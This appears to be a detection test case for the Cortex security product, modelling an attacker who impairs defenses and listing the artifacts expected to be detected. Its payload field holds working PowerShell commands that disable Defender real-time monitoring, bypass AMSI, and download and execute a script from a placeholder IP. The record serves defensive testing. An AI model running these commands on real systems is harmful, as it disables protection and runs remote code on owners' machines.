identity.description: An attacker uses PowerShell to disable Microsoft Defender's real-time monitoring and patches AMSI in memory before executing a payload. Cortex should detect the PowerShell command line arguments and the tampering behavior.

techniques.name: Impair Defenses: Disable or Modify Tools

payload.code:
powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell.exe -WindowStyle Hidden -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation'); [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true"
powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.5/payload.ps1')"

expected_artifacts.description: PowerShell process with command line containing DisableRealtimeMonitoring
PowerShell process with command line containing AMSI patching
Outbound connection to test C2 IP
